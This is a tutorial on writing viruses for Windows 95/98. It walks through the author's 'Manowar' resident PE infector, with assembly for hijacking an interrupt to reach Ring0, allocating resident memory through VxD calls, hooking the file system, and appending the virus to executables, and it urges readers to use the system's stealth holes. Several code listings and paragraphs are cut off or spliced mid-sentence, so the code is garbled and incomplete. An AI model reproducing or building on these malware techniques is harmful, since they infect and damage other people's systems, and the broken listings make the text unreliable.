<P> <b>Foreword </b></P>
<P>
        Well,  here  I  am  again... finally writting what I was willing to
 write  for  at  least one year now. A Win95 residency tutorial. Since this
 tute  is  a  little limited due to the fact that the method presented here
 doesn't  work  under  WindowsNT,  I  will  expand it in another direction,
 presenting  the  entire  process of going resident, catching and infecting
 the  PE  files.  As you will see, this resembles very much to good old DOS
 resident  viruses, with one exception: it's much more easy! Really... Just
 follow all instructions, read everything carefully, get a grip on the docs
 you  need  and  then... be imaginative!! The holes in win95/98 are so dark
 and big, they offer so many stealth opportunities and so many flaws can be
 used that you need to be VERY imaginative! I will start by presenting some
 basic  things  like  concepts and such, docs and utils you need and so on.
 So, let's ride...
</P>
<P> <b>Basics </b></P>
<P>
        Before going to the way let me tell you what are the docs you might
 need  in  order  to  be  able to properly understand, use and develop this
 method:
</P><PRE>
        Microsoft SDK (msdn.microsoft.com)
        Microsoft DDK (www.microsoft.com/hwdev/ddk)
        Visual C++ include files
        Ralph Brown list
</PRE><P>
        The  infos  in  these docs are redundant. By this I mean that there
 are 3 DDK's at the moment: DDK98 (windows98), DDK40 (windowsNT 4.0), NTDDK
 (beta  2  for  windowsNT 5.0, or windows 2000). Also many files in the DDK
 and  SDK  can  be found in the Visual C++ include files. The thing is that
 the  DDKs  are  huge  files  (29-50Megs),  so it's better to just copy the
 includes from somebody...
</P>
<P> <b>Now let's work... </b></P>
<P>
        The entire Windows95/98 is built basically at two levels that go by
 the  name of Ring0 and Ring3. Trust me, I have no idea where did ring1 and
 2  go  ;-))).  Anyway,  these  are  called priviledge levels. Ring0 is the
 highest priority and Ring3 is the lowest priority. The kernel, the core of
 the system is running at Ring0.
</P>
<blockquote>
  <p> Def: "Running at Ring0" = running with the highest priorities, meaning you 
    have all the hardware access possible. </p>
  <p> "Running at Ring3 = running with the lowest priorities, actually being able 
    to only execute what the kernel system is offering. </p>
</blockquote>
<P>
        The  kernel  so, runs at Ring0. Do you remember good old times when
 you  were  able  to  use  ports to read hardisk areas and stuff like that?
 Well,  inside the win32 system you can only do this when running at Ring0.
 When  running  at Ring3, like all user applications do, you are restricted
 to the Windows APIS (check my article on using Windows APIS and also check
 the  Win32  API  Programmers  Help). Here, in these APIS you will realize,
 when  checking  them,  that  basically  it is pretty hard to get resident.
 That's   because  of  the  Windows95  particular  system  of  running  the
 applications.
</P><P>
        Basically  the  thing goes like this: Windows creates a memory area
 for  the  process  that  is  about  to run and then starts it. The running
 process  is  restricted  (not quite, but let's say so) to it's zone. It is
 pretty  hard for one process to affect other running processes. Also, when
 the  process  ends, the entire memory area is wiped. So, basically you can
 go  resident  using  APIS  in  the  current process memory zone (using the
 GlobalAlloc  API),  but  once  the  process is shut down, so is the virus.
 Usually  these  kinds of viruses go resident in the process area and spawn
 themselves  (create a new process) with the virus itself, but the sapwning
 method is not the issue of this article...
</P><P>
        Anyway,  what  I  was  trying to explain is that when at Ring3 your
 hands  are  pretty  tied  up...  So  we establish one thing: we must reach
 Ring0.  This  is the first goal. What we are about to do when at Ring0...,
 well we'll see about that.
</P><P>
        One  of  the first (if not even the first) virus that used the next
 method  of getting into Ring0 was CIH. This virus was widely spread during
 the  year  1998,  but  it didn't get many fans due to the fact that it was
 highly destructive (wipping the HDD and the flash bios if any). Hence, the
 virus  writters  took  the best out of it, and that is one method of going
 into Ring0.
</P><P>
        In Windows, whenever something really bad happens, something called
 Exception  Error  pops  up.  The  Exception Error is something that wasn't
 suppose to happen, but it did... In order to announce the user about this,
 the  system  issues  an INT. At that point, the system jumps into Ring0 in
 order  to  be able to do all its internal laundry... This is what our code
 will  do.  It  will  try to modify the address of an interrupt, issue that
 interrupt,  thus  making  the system believe that some error occured. When
 this  happend,  it  jumps  in  Ring0 and suddenly we find ourselves in our
 handler  going at Ring0 (check next chapter to see all steps)... One down,
 still to go!!
</P>
<blockquote>
  <p> Let's see what can we do at Ring0 and what do we need to do... </p>
</blockquote>
<P>
        There  exist  something  in  Windows called a VxD (Virtual Driver).
 This  thing  goes back to win31... The virtual drivers are actually pieces
 of  code  which  run  at  Ring0.  They have a special way of accessing the
 hardware  resources  and  this is called the VxD call. You can think about
 the  VxD  call  like  about  the  old dos Int 21h. Why is that? Because it
 accepts  parameters  in  different  registers,  makes  a  call and returns
 different  parameters in different registers. This approach brings it more
 closer  to  old  dos  methods of calling interrupts than the new win32 way
 which  introduces  the push on stack parameters and the calls to very easy
 to  remember  functions (like CreateFile, etc...). Anyway, the VxD call is
 encoded in a special way. You must define it in your code kinda like this:
</P><PRE>
        vxdcall macro vxd_id, service_id
                      int 20h
                      dw service_id
                      dw vxd_id
                endm
</PRE><P>
        You  define  this  macro in the beginning of your code and then you
 use it like this:
</P><PRE>
        vxdcall 40h, 32h  (only an example)
</PRE><P>
        This example generates the following code:
</P><PRE>
        CD20h     int 20h
        0040h     dw  40h
        0032h     dw  32h
</PRE><P>
        When  the  code  gets  executed,  windows recognizes the Int 20h as
 being  a  VxD  call  and interprets the following parameters (these params
 will  be  discussed  later). If the system doesn't recognize the VxD ID or
 the  service  ID  the well known blue screen appears saying something like
 "Invalid  VxD  call"...  But,  remember,  you  can  only do VxD calls when
 running at Ring0. If you are at Ring3 you will get and exception error.
</P><P>
        So,  continuing,  when  windows  stumbles  over  this the so called
 callback routine changes the above sequence into something like this:
</P><PRE>
        call [address]
</PRE><P>
        where  address  is  a pointer which holds the actual address of the
 VxD service.
</P><P>
        Don't  try  to  hard  find  these  addresses  and  try to call them
 directly,  from  Ring0 or Ring3. Firstly, this would fail and secondly the
 addresses are not supposed to be fixed. And this will be proven soon.
</P><P>
        The  fact  that  the  initial encoding of the VxD call gets changed
 into  a  call  is a big problem that needs to be solved. That's because in
 order  to  infect  a  file  you must use VxD calls. When you use one, it's
 encoding gets changed and the victim file will get infected with a copy of
 the  virus,  but  with  the  VxD  calls  ALREADY  changed  by the callback
 function.  The  next  time  the victim runs, an exception error will occur
 when  the  EIP  will reach that call. Even if the VxD address is there, by
 doing  a  direct  call  there  you will get an exception error. How to fix
 this, we'll see later...
</P><P>
        Now, let's discuss about the VxD calls we will use and how...
</P><P>
        The  most  important and used by us is the IFSMgr Vxd service. This
 is  the  one  that  allows  us to practically go resident, catch files and
 infect them. Here is how to define it:
</P><PRE>
        IFSMgr = 0040h
</PRE><P>
        Now let's study some of the VxD calls we will use in out code:
</P>
<P> <b>GetHeap = 000dh </b></P>
<PRE>
        Usage:

                mov eax, memory_needed     ;
                push eax                   ; push requested memory
                vxdcall IFSMgr, GetHeap    ;
                pop ecx                    ; memory obtained here
                or eax, eax                ; new address in eax
                jz no_memory               ;
</PRE><P>
        So,  you  must  push  the ammount of memory you need, then call the
 GetHeap VxD call. After this you pop from stack the  amount of memory that
 was  allocated and in EAX you get the address of the new memory zone. From
 EAX up to EAX+ECX is the area you just allocated... Usually this gives you
 a  free  zone  somewhere above 0C000000, more likely around 0C1000000h, or
 anyway somewhere there...
</P><P>
        This  was the call that allowed us to go resident. Now all you need
 to  do is move the code there (check code study). The next VxD call is the
 one that will allow us to catch the files:
</P>
<P> <b>InstallFileSystemAPIhook = 0067h </b></P>
<PRE>
        Usage:

                lea eax, API_hook
                push eax
                vxdcall IFSMgr, InstallFileSystemAPIhook
                pop ebx
                mov nexthook, eax
</PRE><P>
        So, you push the address of a procedure where you will handle files
 and  then  you  get  in eax the address of the next hook which you need to
 save.  At  the  end of your own hook routine you will need to call this in
 order  to  close  the circle. This looks exactly like old Int 21h hooking.
 You  install  a  routine  that  catches  system calls regarding files, you
 process  what  you need and afterwards you call the original routine. Very
 simple,  but  please check the code analyze to get it right... And, I hope
 you  understood already that the API_hook routine will run at Ring0. After
 all, the system needs everything there...
</P><P>
        When  entering into the API_hook, not only ours, but any, the stack
 looks like this:
</P><PRE>
      Offset | Size |  Explanation
     --------+------+---------------------------------------------------
      00h    |  DD  |  Saved EBP
      04h    |  DD  |  Return address
      08h    |  DD  |  The address of the FSD to be called
      0Ch    |  DD  |  The action that will be performed
      10h    |  DD  |  The drive where do to de operation on
      14h    |  DD  |  The kind of resource the operation is done on
      18h    |  DD  |  The codepage that the user string was passed in on
      1Ch    |  DD  |  A pointer to a IOREQ structure
</PRE>
<blockquote> 
  <p> The main interest for us are the following: </p>
  <p> 0Ch = action to be performed, or example file open, file rename, file read, 
    etc... </p>
  <p> 10h = drive where the operation takes place </p>
  <p> 1Ch = the IOREQ structure </p>
  <p> About the action, here are some common valuez to check for: </p>
</blockquote>
<PRE>
        IFSFN_OPEN       = 36
        IFSFN_RENAME     = 37
        IFSFN_FILEATTRIB = 33
</PRE><P>
        About the drive type, this is defined as a &gt;0 number, where 1 means
 drive  A.  So,  you  may  want  to  skip  infection on floppy disks as the
 operations are slower.
</P><P>
        The codepage should be an important parameter, but I choosed not to
 used  it.  When converting the strings as you will see later, the codepage
 is  used  to  obtain  a  correct convertion to ASCII of the Unicode string
 type.
</P>
<blockquote>
  <p> About the IOREQ structure, it is defined as follows: </p>
</blockquote>
<PRE>
        ioreq   struc
            ir_length  dw ? ; length of user buffer (eCX)              00h
            ir_flags   db ? ; misc. status flags (AL)                  02h

            ir_fh      dw ? ; file (or find) handle                    1Eh
            ir_pos     dd ? ; file position for request                20h
            ir_aux2    dd ? ; misc. extra API parameters               24h
            ir_aux3    dd ? ; misc. extra API parameters               28h
            ir_pev     dw ? ; ptr to IFSMgr event for async requests   2Ch
            ir_fsd     db (size fsdwork) dup (?) ; Provider work space 2Eh
         ioreq   ends
</PRE><P>
         where fsdwork is:
</P><PRE>
         fsdwork struc
                 dw 16 dup(?)
         fsdwork ends
</PRE><P>
         It's off little importance now what you can find in the additional
 fields inside the aux1, 2, 3 fields. What we are looking at is the unicode
 pathname.  You  can see that it is found at IOREQ+0Ch. So, in order to get
 a pointer to the Unicode path name of the file we must do the follwing:
</P><PRE>
               mov eax, [ebp+1Ch]                    ; get IOREQ pointer
               mov eax, [eax+0Ch]                    ; point the filename
               add eax, 4                            ;
</PRE><P>
        The add is needed to skip some crap in the beginning of the UniCode
 path.  In  this  simple  way  (only 3 instructions, you don't even have to
 remember  the  IOREQ  structure),  we  have  EAX  pointing the filename in
 Unicode system.
</P><P>
        Now  EAX  points  to  the  filename!  Check below the code to fully
 understand.
</P><P>
        So,  basically the API_hook must preserve all the stuff which comes
 on the stack, do the dirty job and then restore the stack! That's it!
</P><P>
        So,  now  we  are  able  to  catch files. That's because every time
 windows   is   doing   any   kind   of   file   operation,  it  calls  the
 FileSystemAPIhook.  Now  let  us  focus  on  another important call, which
 allows us to make all the needed operations on files:
</P>
<P> <b>Ring0_FileIO = 0032h </b></P>
<PRE>
        Usage:

                mov registers, parameters
                vxdcall IFSMgr, Ring0_FileIO
</PRE>
<blockquote> 
  <blockquote>
    <p> Usually because this VxD call is used more often you should make an call 
      to it like this: </p>
  </blockquote>
</blockquote>
<PRE>

                ...
       Ring0_File_IO:

                ret
</PRE>
<blockquote> 
  <blockquote>
    <p> For the parameters we have the following: </p>
  </blockquote>
</blockquote>
<PRE>
        1) Opening a file
        =================

                lea esi, filename           ; file name
                mov bx, 2                   ; open style
                mov cx, 0                   ; file attribute

                mov eax, R0_OPENCREATFILE   ;
                call Ring0_File_IO          ;

                R0_OPENCREATEFILE = 0D500h
</PRE>
<blockquote> 
  <blockquote>
    <p> On return we have in EAX the file handle. If CF is set then an error occured. 
    </p>
  </blockquote>
</blockquote>
<PRE>
        2) Reading from a file
        ======================

                lea esi, buffer      ; buffer to read to
                mov ebx, handle      ; handle as given by OPENCREATEFILE
                mov ecx, size        ; bytes to read
                mov edx, pos         ; position in file
                mov eax, R0_READFILE ;
                call Ring0_File_IO   ;

                R0_READFILE = 0D600h
</PRE><P>
                The  fact  that  you are allowed to specify the position in
 file  to  read  from is particulary nice. To read consequent passages from
 one  file  you  need  to make yourself a variable and increase it with the
 size  read  everytime  and  then use that variable as the position in file
 parameter. CF set means error.
</P><PRE>
        3) Writing to a file
        ====================

                lea esi, buffer       ; buffer to write from
                mov ecx, size         ; bytes to write
                mov ebx, handle       ; handle of file
                mov eax, R0_WRITEFILE ;
                mov edx, pos          ; position in file to write at
                call Ring0_File_IO    ;

                R0_WRITEFILE = 0D601h
</PRE>
<blockquote> 
  <blockquote>
    <p> This is similar to file read. </p>
  </blockquote>
</blockquote>
<PRE>
        5) Closing a file
        =================

                mov ebx, handle        ; handle
                mov eax, R0_CLOSEFILE  ;
                call Ring0_File_IO     ;

                R0_CLOSEFILE = 0D700
</PRE><P>
        So,  these  are  all  the  calls you need to know in order to open,
 read,  write  and close a file. Don't you see a hitting resemblance to the
 Int  21  file  handling?  Oh, yes it is... That's because deep down inside
 even  windows95/98  calls the int21... But that's a whole other story. You
 just keep in mind the above stuff and check forward how to use it exactly.
</P><P>
        Some  more,  but  not  described in the code study area are the set
 attributes and get attributes calls:
</P><PRE>
        R0_FILEATTRIBUTES = 04300h
        GET_ATTRIBUTES    = 00h
        SET_ATTRIBUTES    = 01h
</PRE>
<blockquote>
  <p> Use them like this: </p>
</blockquote>
<PRE>
        Getting attributes:
        -------------------

        lea esi, filename
        mov eax, R0_FILEATTRIBUTES + GET_ATTRIBUTES
        call Ring0_File_IO
</PRE>
<blockquote>
  <p> This returns in ECX the attributes. </p>
</blockquote>
<PRE>
        Setting attributes
        ------------------

        lea esi, filename
        mov ecx, newattributes
        mov eax, R0_FILEATTRIBUTES + SET_ATTRIBUTES
        call Ring0_File_IO
</PRE><P>
        You can use this calls if you want to restore the attributes of the
 infected files. In Manowar I didn't use these.

</P><P>
        One more thing to say would be this: When the API hook gets called,
 the  filename which is about to be accessed comes as a parameter but it is
 in  Unicode system. The Unicode is some stuff invented by a very smart guy
 in  order  to  be able to write in all kinds of languages which don't have
 the  US  alphabet. Something like an Esperanto for computers... Anyway, in
 order to be able to use the file you must turn it into BCS system. This is
 done  by  the  UniToBCSPath Vxd call. You can do it by hand, butI wouldn't
 recommend it to you... Check the UniToBCSPath call explained below.


</P><P>
        Basically  this  is  what you need to know as to make a big picture
 about  how  it is going... I have to repeat once again that this resembles
 very  much  with  old  dos resident viruses using Int 21 hooking. It's the
 same  idea,  the  same method, but only different kinds of calls... You'll
 get used to it soon, as I did too...
</P><P>
        Before  jumping  to  code  study  let  me  tell  you a few words on
 something  else  we will be using in here, and that's the SEH frame. It is
 not particular to win32 Ring0 programming, but it is widely used. It seems
 that  Microsoft(C) tried to hide a little the things behind the SEH frame.
 SEH   means  Structured  Exception  Handler.  Briefly  everytime  a  nasty
 exception  error  occures,  the  SEH  frame receives control. Here, on the
 stack  there  are several informations that are vital into giving the user
 an  warning  about  what  has happened. It's the SEH frame that brings you
 that  window  that  says  "The program tried to do an ilegal operation and
 will  be shut down". You will see that the SEH frame is very important for
 us,  especially  as we are dealing with a very sensitive thing like Ring0.
 So,  what we are interested to do is setup a SEH frame so that if an error
 occures,  the  program won't stop, instead it will restore everything back
 and jump back to the host. The SEH frame is set like this:
</P><P>
        On  entry  the  FS:[0]  points  to the original SEH frame, which we
 retrieve and save:
</P><PRE>
       mov eax, dword ptr fs:[00H]           ; get the old seh pointer
       mov dword ptr [ebp+SEH_nextpointer], eax; set in structure
       mov dword ptr [ebp+SEH_oldpointer], eax ; and save for restore
</PRE><P>
       Then  we take a pointer to our own exception handler and replace the
 dword at FS:[0]:
</P><PRE>
       lea eax, [ebp+return_to_host]         ; make it point here...
       mov dword ptr [ebp+SEH_errorhandler], eax;
       lea eax, [ebp+SEH_nextpointer]        ;
       mov dword ptr fs:[00H], eax           ; and point the structure
</PRE><P>

        The SEH pointers are defined like this:
</P><PRE>
                SEH_next_pointer DD ?
                SEH_errorhandler DD ?
</PRE><P>
        So  basically the SEH points to a kinda like inversed way. Our real
 pointer is the second and it points to a return_to_host address. There you
 must  restore  the  SEH  handler  (check  code)  in  only  two  lines  and
 everything is ready...
</P><P>
        Now let us start and check the code more attentively:
</P>
<P> <b>Code study </b></P>
<P>
        In  order  for  you  to  understand  very well all that I explained
 above,  I  decided to take a piece of code of my own and describe it piece
 by  piece. This way all the fog will clear up and soon you will be a Ring0
 expert!
</P><P>
        The  code  I  used in this study is a virus of mine called Manowar.
 It's  my  first Ring0 virus, fully functional, but test only (no messages,
 debug  beep  included,  no  encryption,  etc...).  So,  let's  get down to

 there  is  a  description  of  how  we will encode the stuff inside the PE

        We  start  to code!! First let's set the SEH handler I talked about
 before:
</P>
<blockquote>
  <PRE>
realstart:                                       ;
       mov eax, dword ptr fs:[00H]               ; get the old seh pointer
       mov dword ptr [ebp+SEH_nextpointer], eax  ; set in structure
       mov dword ptr [ebp+SEH_oldpointer], eax   ; and save for restore
       lea eax, [ebp+return_to_host]             ; make it point here...
       mov dword ptr [ebp+SEH_errorhandler], eax ;
       lea eax, [ebp+SEH_nextpointer]            ;
       mov dword ptr fs:[00H], eax               ; and point the structure
</PRE>

<P>
        Now  we  are sure that if something bad happens, the code will jump
 to  our  error  handler,  which  actually  points  to return_to_host, thus
 jumping back to the host and making the user not notice the error.
</P><P>
        Now let us prepare to go into Ring0:
        The  SIDT  (Store Interrupt Device Table) stores the address of the
 IDT  at  the  destination.  The first two bytes are the length of the IDT.
 Then  the  offset  for  each  interrupt is to be found at Interrupt Number
 multiplied by 8. There you have two words in inverse format that  point to
 the  interrupt.  All  we  need  to  do is save the old address and set the
 address  to  point  to  our own routine (called Ring0 here). The interrupt
 used here is Int 3:
</P>
<blockquote>
  <PRE>
       sidt [ebp+IDT_Address]                ; Get interrupt address
       mov esi, dword ptr [ebp+IDT_Address+2]; (first 2 are the length)
       add esi, exception_int*8              ; get the offset for Int
       mov dword ptr [ebp+exception], esi    ; save exception place
       mov bx, word ptr [esi+6]              ; get low word

       mov dword ptr [ebp+old_offset], ebx   ; save exception offset
       lea eax, [ebp+offset Ring0]           ; eax=new Int handler
       mov word ptr [esi], ax                ; store high word

        Before  going  to  Ring0  it's  better  to check if you are already
 resident. Manowar does it like this:
</P>
<blockquote>
  <PRE>
       mov eax, 0c000e990h                   ; check residency mark...
       cmp dword ptr [eax], 'MWAR'           ; use your own here...
       jne go_on_to_ring0                    ;
       jmp already_installed                 ;
</PRE>
</blockquote>
<P>

        Now  we  are  ready  to go to Ring0. We generate an interrupt which
 jumps us into the Ring0 routine...
</P>
<blockquote>
  <PRE>
go_on_to_ring0:                              ;
       int exception_int                     ; Generate exception -&gt; Ring0 !
</PRE>
</blockquote>
<P>
        After  the  Int  is  executed, the control comes back here. Also we
 find  ourselves here if the virus was already resident. Our job here is to
 restore  the  Exception  Interrupt address, the SEH frame and to return to
 the host:
</P>
<blockquote>
  <PRE>

       Call ExitProcess                      ; and exit
</PRE>
</blockquote>
<P>
       So  you  noticed that after we restore the IDT and the SEH, we check
 if we are in generation one, thus issuing an ExitProcess, otherwise we use
 the  OLD_Eip  aligned  with the image base. How we retrieve these you will
 find explained a little later.

</P><P>
        Now let's take a look at the Ring0 routine... This is where we will
 go  resident  and  install  our File System Hook. Before doing this let me
 stop  a  little and return to something I spoke about a while back so that
 you  won't  get  confused.  I explained you how the calls to a VxD service
 damage  the  encoding  and  turn  it into a call. Well, the method used in
 Manowar  (and firstly applied by Quantum in FuckHarry) is to restore it by
 hand.  This means that after the call is issued, later in the code you put
 back  the  values to restore the Int20/dw/dw structure. For this, you will
 see  before  each  VxD  call a label saying fix_n. Also above it an equate
 saying:  fix_n_value equ vxd_id+256*256*IFSMgr. Later when we will fix the
 calls,  we will simply put a CD20h (Int20h) at the fix_n address, and then
 the  fix_n_value  at  fix_n+2  address.  By  this  method  the initial VxD
 encoding  is  restored.  If you do not really understand this, just try it
 our in TD32 and see how it goes...

<P>
        If we are here than the memory allocation was successful and we are
 about to copy our virus into memory:
</P>
<blockquote>
  <PRE>
       xchg eax, edi                         ; EDI = new free memory area
       lea esi, dword ptr [ebp+start]        ; ESI = start of virus
       push edi                              ;

       mov dword ptr [ebp+newaddress], edi   ;
       mov dword ptr [edi+delta1-start], edi ;
</PRE>
</blockquote>
<P>
        Let's  understand  the  delta  handle now... We will use EDI as the
 base  of  our virus into the new memory area. But when our virus was first
 compiled,  all the addresses were aligned to the START. Meaning that if we
 want  to address an address in the new memory, we must substract the START
 and  add  the  new delta EDI. So all memory addressing inside the new code
 will be like this:
</P><PRE>
        [edi + variable - start]
</PRE><P>
        But  later  on  when  the FileSystemAPIhook will be called, the EDI
 will  be  lost! That's why we put it's value into the delta1 variable. You
 will see later how we use it...
</P><P>
        Now  let's  install  our  API  hook.  Note that we are referring to
 addresses  into  the new allocated memory, where the copy off the virus is
 resident:
</P>
<blockquote>
  <PRE>
       lea eax, [edi+API_hook-start]         ; FSAPI hook
       push eax                              ;
                                             ;
fix_2_value equ InstallFileSystemAPIhook+256*256*IFSMgr;

       jmp install_success                   ;
</PRE>
</blockquote>
<P>
        In this simple way, we are now the owners of the File System. Every
 calls to access the files will first run through our API_hook routine.
</P><P>
        Now some final things:
</P>
<blockquote>
  <PRE>
no_free_mem:                                 ;

</blockquote>
<P>
        You  see  how easily we get out from Ring0 to Ring3. A simple Iretd
 does the trick!
</P><P>
        Now  let  us  focus on the API hook routine. Here is where the code
 gets control everytime a file is accessed. We will enter in a C like style
 to  have  the stack pointed by EBP. This is done like this because we will
 be  needing  stuff  of  the  stack.  Before we start to do our job we must
 remove  from the stack the parameters and then we will put them back. This
 is  the  way  QG used the API_hook in FuckHarry. You can address the stack
 directly by using [esp].

</P>
<blockquote>
  <PRE>

<P>
        The  above  line  puts in EDI the value we computed earlier when we
 went resident. It's actually the base where the virus is resident and it's
 use is of a delta handle.
</P><P>
        The  calls  to  file  access are very often. Inside here we will do
 some  of  our  own.  It's  very  important not to reenter in this routine.
 Therefore  we will set avariable which will be 1 while we are inside here.
 We compare it to 1 to see if we can go on:

        We  are about to create the name of the file that will be accessed.
 The  parameter  at EBP+16 is the drive type. 1 means A, 2 means B, etc. We
 add  40h to it to obtain the ascii value (A, B, C,...). Then we add a ':\'
 in order to have a full path (like c:\):
</P>

                Now we are about to make the conversion. The parameter at EBP+28 is
 the IOREQ structure. In the IOREU structure at offset 12 you have the file
 namein  Unicode  format.  The pushed parameters are as follows: 0, maximum
 length,  offset  of unicode format, offset where to put the asciiz string.
 You need to put yourself the terminator Z to make it an asciiz string.

        After  we read the last section, we first verify if the file wasn't
 already  infected  and  if  no, we save different values that we will need
 later:

<P>
        So, here is where you save the original victim's entrypoint and the
 image  base  which  you  absolutely  need  in  order to be able to run the
 original  file.  The  SizeOfImage  is  a  field  you  must  update and the
 alignements are used later.
</P><P>
        Now  we  start  updating the section. First we increase the size of
 raw  data  with the virus size and we align it to file alignement. Also we
 save the place that the virus will be copied to (original PointerToRawData
 +  original VirtualSize). Also, we must increase the VirtualSize, but this
 doesn't get aligned:

        After  we  did  all  this,  before  writing the actual virus to the
 victim  we must restore the VxD calls I was talking about before. You will
 ask, ok you restore them, but still after this you must use them, so, they
 will  get damaged again... True! But... all the VxD calls that get damaged
 again  are _AFTER_ the lines below. So even if they get damaged, next time
 the  code runs, before going over them damaged it goes over the next lines
 and  restores  them. The _ABOVE_ VxD calls are already restored!! Hope you
 got it:

        This  is  it... A simple, yet reliable, fast and short Windows95/98
 virus.  To  get  a  really good grip on the things, browse the real source
 code  for  the  Manowar 1.0 virus. Also, other very good Ring0 viruses are
 CIH,  Fuck  Harry, Next Step, Sexy, and others. However, Quantum's viruses
 use a special way of getting ring0.
</P><P>
        To  make a Ring0 virus is not at all an easy task. First of all, it
 is  almost  imposible  to debug. I think only SoftIce could do this, but I
 particulary  don't  like  it... So, one way of debugging it, if you cannot
 get  it work is the debug beep. Here is a small routine that makes a beep.
 It only works if you are in Ring0 and was written by Z0mbie:
</P>
<blockquote>
  <PRE>
 beep:
       pushad
       mov ax, 1000
       mov bx, 200

       dec bx

       popad
       ret
</PRE>
</blockquote>
<P>

        Everytime you don't know why your code doesn't work, insert a call
 to the beep routine. Usually you put them after the VxD calls. If the beep
 is  heard  than  it's ok. Otherwise some parameters are not ok... Also, be
 very  carefull  inside  the  API_hook  routine.  ALL  and  I mean ALL file
 accesses  run through here. If you mess one parameter up very nasty things
 may  happen (remember that windows swaps memory chunks to the swap file in
 order to have more memory; a mistake in your code might make it loose data
 and create cross or lost links). So, check very carefull your code. At the
 first error, reboot imediatelly... Anyway you will get rebooted a thousand
 times until you make it ;-)
</P>
<P> <b>Final word </b></P>
<P>
        As  a  final  word here... This method of Ring0 will not last long.
 That  is  because  the  WindowsNT  is so well armoured against the user to
 reach  Ring0 that is almost impossible to do it. There is however a way to
 do  it by using Int2E (check RBLIST), but this is not documented and might
 change.  In  the near future I will post a new article regarding win32 api
 residency using the process spawn method. I think that method is much more
 reliable. Until then, the Ring0 method seems to work pretty ok... Check my
 Manowar  test  virus.  It  infects  goat.exe files and sends beeps. Pretty
 nice  for  a start... Anyway, like I shared all this with you, even if you
 knew  it already, I tried to concentrate it in an article, please get back
 to  me  with any kind of info and I will give you full credit in my future
 articles  and code... Probably my next code will be however my polymorphic
 engine that works on 32bits...
